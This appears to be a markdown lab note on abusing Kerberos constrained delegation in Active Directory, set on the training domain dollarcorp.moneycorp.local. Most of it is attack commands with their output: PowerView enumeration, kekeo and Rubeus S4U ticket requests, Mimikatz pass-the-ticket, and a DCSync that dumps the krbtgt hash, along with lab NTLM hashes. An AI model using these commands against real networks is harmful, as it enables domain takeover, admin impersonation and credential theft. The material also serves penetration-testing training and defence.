# Abusing Constrained Delegation privileges

Constrained delegation - when enabled on a service account, allows access ony to **specified** services on **specified** computers by impersonating a incoming user

To impersonate the user, Service for User (S4U) extension is used which
provides two extensions:
- Service for User to Self (S4U2self) Allows a service to obtain a forwardable TGS to itself on behalf of a user.
- Service for User to Proxy (S4U2proxy) Allows a service to obtain a TGS to a second service on behalf of a user.
- 

## Abusing Constained Delegation enabled - USERS 
### kekeo
1. Enumerate users with constrained delegation
```powershell
# powerview_dev.ps1
Get-DomainUser -TrustedToAuth

# Observe the following:
# samaccountname: websvc
# msds-allowedtodelegateto: {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}
# useraccountcontrol: TRUSTED_TO_AUTH_FOR_DELEGATION

```

2. We can use the tgt::ask module from kekeo to request a TGT from websvc.
```powershell
.\kekeo.exe

tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /ntlm:cc098f204c5887eaa8253e7c2749156f
```

3. Using the TGT we can request a TGS for the service as the domain administrator
```powershell
tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
```

4. Inject the ticket in current session to use it 
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'

```

5. Check 
```powershell
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

### Rubeus - Abusing constrained delegation for USERS
Alternatively, we may use Rubeus

```powershell
.\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt

# check if TGS is injected
klist

#Cached Tickets: (2) 
#..
#Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL 
#Server: CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL 
#..

# access service
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

## Abusing Constained Delegation enabled - COMPUTERS 
1. Enumerate computer accounts with constrained delegation
```powershell
# powerview_dev.ps1
Get-DomainComputer -TrustedToAuth

# Observe the following:
# cn: DCORP-ADMINSRV
# msds-allowedtodelegateto: {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}
# useraccountcontrol: TRUSTED_TO_AUTH_FOR_DELEGATION

```

2. We can use the tgt::ask module from kekeo to request a TGT from websvc.
```powershell

. .\kekeo.exe

tgt::ask /user:dcorp-adminsrv /domain:dollarcorp.moneycorp.local /ntlm:5e77978a734e3a7f3895fb0fdbda3b96
```

3. Since there is no SNAME validation, we can request TGS for time and also ldap service on dcorp-dc as the domain administrator - Administrator
```powershell
tgs::s4u /tgt:TGT_dcorp-adminsrv@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL

#> Ticket in file 
#'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL.kirbi' 
#.. 
# Ticket in file 
#'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi'

```

4. Use the LDAP ticket now
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

5. Using this TGS, we can use DCSync from mimikatz without DA privileges and get KRBTGT hash
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

# ..
# SAM Username : krbtgt
# Hash NTLM: ff46a9d8bd66c6efd77603da26796f35
# ..
```

### ### Rubeus - Abusing constrained delegation for COMPUTERS
Alternatively, we may use Rubeus
```powershell
.\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:8c6264140d5ae7d03f7f2a53088a291d /impersonateuser:Administrator /msdsspn:"time/dcorp-dc.dollarcorp.moneycorp.LOCAL" /altservice:ldap /ptt

# check
klist 

# Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL 
# Server: ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL

```

At this point we may run DCSync attack to dump KRBTGT hash
